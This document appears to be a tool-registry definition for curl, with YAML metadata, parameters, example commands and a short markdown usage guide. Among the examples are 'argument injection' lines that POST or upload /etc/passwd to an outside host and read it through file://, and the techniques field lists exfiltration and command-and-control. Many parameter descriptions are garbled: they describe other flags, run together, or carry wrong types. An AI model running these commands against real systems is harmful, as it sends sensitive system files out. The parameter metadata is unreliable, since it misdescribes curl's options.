---
id: network-http-curl
namespace: network:http:curl
name: curl
description: Transfers data from or to a server using supported protocols (HTTP, HTTPS,
  FTP, SFTP, SCP, etc.).
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.transfer.download
  - network.transfer.upload
  - network.http.api
  - network.http.fetch
  - network.http.inspect
  - system.file.read
  - system.file.write
platforms:
  - linux
  - macos
  - windows
  - cross-platform
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - jq
  - httpie
  - wget
  - network-http-wget
artifacts:
  - type: network.http.response
    description: Raw HTTP response body
    mime: text/plain
    trust_level: verified
  - type: network.http.headers
    description: HTTP response headers
    mime: text/plain
    trust_level: verified
  - type: network.transfer.file
    description: File downloaded from remote server
    trust_level: community
workflow_edges:
  produces:
    - http-response
    - downloaded-file
  consumes:
    - url
    - request-headers
contract:
  inputs:
    - type: network.target.url
      description: Target URL for HTTP request
    - type: network.http.headers
      description: Custom HTTP request headers
  outputs:
    - type: network.http.response
      description: HTTP response body
      mime: text/plain
    - type: network.http.headers
      description: HTTP response headers
      mime: text/plain
  side_effects:
    - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 32
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 32
  network: medium
  disk_io: low
allowed-tools:
  - curl
  - Bash
  - execFile

parameters:
  - name: abstract-unix-socket
    type: file
    required: false
    description: "--alt-svc <filename> Enable alt-svc with this cache file --anyauth
      Pick any authentication method"
    aliases:
      - --abstract-unix-socket <path>
  - name: append
    type: string
    required: false
    description: "Append to target file when uploading"
    aliases:
      - -a
      - --append
  - name: aws-sigv4
    type: url
    required: false
    description: "--basic HTTP Basic Authentication --ca-native Load CA certs from
      the OS --cacert <file> CA certificate to verify peer against --capath <dir>
      CA directory to verify peer against"
    aliases:
      - --aws-sigv4 <provider1[:prvdr2[:reg[:srv]]]>
  - name: cert
    type: string
    required: false
    description: "--cert-status Verify server cert status OCSP-staple --cert-type
      <type> Certificate type (DER/PEM/ENG/PROV/P12) --ciphers <list> TLS 1.2 (1.1,
      1.0) ciphers to use --compressed Request compressed res..."
    aliases:
      - -E
      - --cert <certificate[:password]>
  - name: config
    type: file
    required: false
    description: "Read config from a file"
    aliases:
      - -K
      - --config <file>
  - name: connect-timeout
    type: integer
    required: false
    description: "Maximum time allowed to connect"
    aliases:
      - --connect-timeout <seconds>
  - name: connect-to
    type: string
    required: false
    description: "Set the connect-to parameter"
    aliases:
      - --connect-to <HOST1:PORT1:HOST2:PORT2>
  - name: continue-at
    type: string
    required: false
    description: "Resumed transfer offset"
    aliases:
      - -C
      - --continue-at <offset>
  - name: cookie
    type: string
    required: false
    description: "Send cookies from string/load from file"
    aliases:
      - -b
      - --cookie <data|filename>
  - name: cookie-jar
    type: file
    required: false
    description: "Save cookies to <filename> after operation"
    aliases:
      - -c
      - --cookie-jar <filename>
  - name: create-dirs
    type: file
    required: false
    description: "Create necessary local directory hierarchy"
    aliases:
      - --create-dirs
  - name: create-file-mode
    type: string
    required: false
    description: "File mode for created files"
    aliases:
      - --create-file-mode <mode>
  - name: crlf
    type: string
    required: false
    description: "Convert LF to CRLF in upload"
    aliases:
      - --crlf
  - name: crlfile
    type: file
    required: false
    description: "Certificate Revocation list"
    aliases:
      - --crlfile <file>
  - name: curves
    type: array
    required: false
    description: "(EC) TLS key exchange algorithms to request"
    aliases:
      - --curves <list>
  - name: data
    type: url
    required: false
    description: "HTTP POST data"
    aliases:
      - -d
      - --data <data>
  - name: data-ascii
    type: url
    required: false
    description: "HTTP POST ASCII data"
    aliases:
      - --data-ascii <data>
  - name: data-binary
    type: url
    required: false
    description: "HTTP POST binary data"
    aliases:
      - --data-binary <data>
  - name: data-raw
    type: url
    required: false
    description: "HTTP POST data, '@' allowed"
    aliases:
      - --data-raw <data>
  - name: data-urlencode
    type: url
    required: false
    description: "HTTP POST data URL encoded"
    aliases:
      - --data-urlencode <data>
  - name: delegation
    type: integer
    required: false
    description: "GSS-API delegation permission"
    aliases:
      - --delegation <LEVEL>
  - name: digest
    type: url
    required: false
    description: "HTTP Digest Authentication"
    aliases:
      - --digest
  - name: disable
    type: string
    required: false
    description: "Disable .curlrc"
    aliases:
      - -q
      - --disable
  - name: disable-eprt
    type: string
    required: false
    description: "Inhibit using EPRT or LPRT"
    aliases:
      - --disable-eprt
  - name: disable-epsv
    type: string
    required: false
    description: "Inhibit using EPSV"
    aliases:
      - --disable-epsv
  - name: disallow-username-in-url
    type: string
    required: false
    description: "Disallow username in URL"
    aliases:
      - --disallow-username-in-url
  - name: dns-interface
    type: string
    required: false
    description: "Interface to use for DNS requests"
    aliases:
      - --dns-interface <interface>
  - name: dns-ipv4-addr
    type: string
    required: false
    description: "IPv4 address to use for DNS requests"
    aliases:
      - --dns-ipv4-addr <address>
  - name: dns-ipv6-addr
    type: string
    required: false
    description: "IPv6 address to use for DNS requests"
    aliases:
      - --dns-ipv6-addr <address>
  - name: dns-servers
    type: string
    required: false
    description: "DNS server addrs to use"
    aliases:
      - --dns-servers <addresses>
features:
  - output-json
  - streaming
  - file-system
  - network-intensive
execution:
  template: "curl {abstract-unix-socket} {append} {aws-sigv4} {cert} {config}"
  sandbox: execFile
  timeout_seconds: 60
  shell: true
global_vars:
  target: ip
  port: port
examples:
  - description: "Perform a simple GET request"
    command: "curl https://api.example.com/endpoint"
  - description: "POST JSON data to an API"
    command: "curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"\
      }' https://api.example.com/submit"
  - description: "Download a file with progress"
    command: "curl -L -o file.zip https://example.com/file.zip"
  - description: "Inspect response headers only"
    command: "curl -I https://example.com"
  - description: Send a local file to a remote server in a POST request.
    command: "curl --data @/etc/passwd http://website.com/\n"
  - description: Read local files by using the file:// schema.
    command: "curl file:///etc/passwd\n"
  - description: Downloads a file to a destination.
    command: "curl http://website.com/ -o /tmp/\n"
  - description: 'Argument injection: upload file: Send a local file to a remote server
      in a POST request.'
    command: curl --data @/etc/passwd http://website.com/
  - description: 'Argument injection: upload file: Send a local file to a remote server
      in a POST request.'
    command: curl -F 'var=@/etc/passwd' http://website.com/
  - description: 'Argument injection: upload file: Send a local file to a remote server
      in a POST request.'
    command: curl --upload-file /etc/passwd http://website.com/
  - description: 'Argument injection: read local file: Read local files by using the
      file:// schema.'
    command: curl file:///etc/passwd
  - description: 'Argument injection: download file: Downloads a file to a destination.'
    command: curl http://website.com/ -o /tmp/
  - description: 'Argument injection: write to local file: Uses file-read to effectively
      copy files.'
    command: curl file:///etc/passwd -o /tmp/
  - description: Download a file from a URL and save it with a specific name
    command: curl -o filename.ext http://example.com/file.txt
  - description: Download a file from a URL and save it with the original filename
    command: curl -O http://example.com/file.txt
  - description: Download a file and limit the download speed
    command: curl --limit-rate 100K http://example.com/file.txt
  - description: Follow redirects if the URL has moved
    command: curl -L http://example.com
  - description: Send POST data to a server
    command: curl -d "name=value" http://example.com/resource
  - description: Send JSON data with a POST request
    command: "curl -H \"Content-Type: application/json\" -d '{\"key\":\"value\"}'
      http://example.com/resource"
  - description: Include headers in the output
    command: curl -i http://example.com
  - description: Display only the HTTP headers for a GET request
    command: curl -I http://example.com
  - description: Send a request with a custom header
    command: 'curl -H "Custom-Header: Value" http://example.com'
  - description: Authenticate with a username and password
    command: curl -u username:password http://example.com
  - description: Use a different request method like PUT or DELETE
    command: curl -X PUT http://example.com/resource
  - description: Download multiple URLs in sequence
    command: curl -O http://example.com/file1.txt -O http://example.com/file2.txt
  - description: Resume a failed or interrupted download
    command: curl -C - -O http://example.com/largefile.zip
  - description: Transfer a file using FTP
    command: curl -T localfile.txt ftp://ftp.example.com/upload/
  - description: Specify a proxy for the request
    command: curl -x http://proxy-server:port http://example.com
  - description: Send data with the URL encoded format
    command: curl --data-urlencode "key=value" http://example.com/resource
  - description: Save the response headers to a file
    command: curl -D headers.txt http://example.com
  - description: Download a file and run it through a pipe (e.g., to `grep`)
    command: curl http://example.com/file.txt | grep "search-string"
references:
  - label: "Official curl documentation"
    url: "https://curl.se/docs/manpage.html"
  - label: "Everything curl book"
    url: "https://everything.curl.dev/"
techniques:
  - command-and-control
  - discovery
  - enumeration
  - collection
  - data-manipulation
  - exfiltration
---

# curl — Data Transfer Client

curl is a command-line tool for transferring data using URL syntax, supporting a wide range of protocols including HTTP, HTTPS, FTP, SFTP, SCP, LDAP, and more. It is one of the most widely used and versatile networking utilities available.

## Core Concepts

curl operates on a simple principle: provide a URL and optional configuration flags, and it will transfer data to or from that endpoint. It supports every major authentication method, protocol variant, and data encoding scheme.

### Request Methods

The HTTP method defines the type of operation curl performs:

| Method   | Purpose                       | Common Use Case              |
|----------|-------------------------------|------------------------------|
| `GET`    | Retrieve data                 | API queries, page downloads  |
| `POST`   | Submit new data               | Form submissions, API writes |
| `PUT`    | Replace existing data         | Resource updates             |
| `DELETE` | Remove a resource             | API deletions                |
| `PATCH`  | Partial resource modification | Incremental updates          |
| `HEAD`   | Retrieve headers only         | Link checking, metadata      |

## Common Usage Patterns

### API Testing

curl is the de facto standard for API testing from the command line:

```bash
# Authenticated API call with bearer token
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
     -H "Accept: application/json" \
     https://api.example.com/v1/users

# GraphQL query
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "query { users { id name } }"}' \
  https://api.example.com/graphql
```

### File Transfer

```bash
# Resume an interrupted download
curl -C - -o largefile.iso https://example.com/largefile.iso

# Upload a file via FTP
curl -T localfile.txt ftp://ftp.example.com/upload/
```

### Debugging and Inspection

```bash
# Verbose output showing full request/response
curl -v https://example.com

# Trace with timing breakdown
curl -w "\nTime: %{time_total}s\n" https://example.com
```

## Security Considerations

- Use `-k`/`--insecure` only for testing; never in production scripts
- Always verify SSL certificates in automated workflows
- Be aware that `-d` data appears in process listings; use `--data-urlencode` for sensitive payloads
- Prefer environment variables or `.netrc` files over inline credentials

## Related Tools

- **[wget](../traffic/wget.md)** — Alternative download tool with recursive capabilities
- **[httpie](../http/httpie.md)** — Human-friendly HTTP client with syntax highlighting
- **[jq](../text/jq.md)** — JSON processor for post-processing curl output
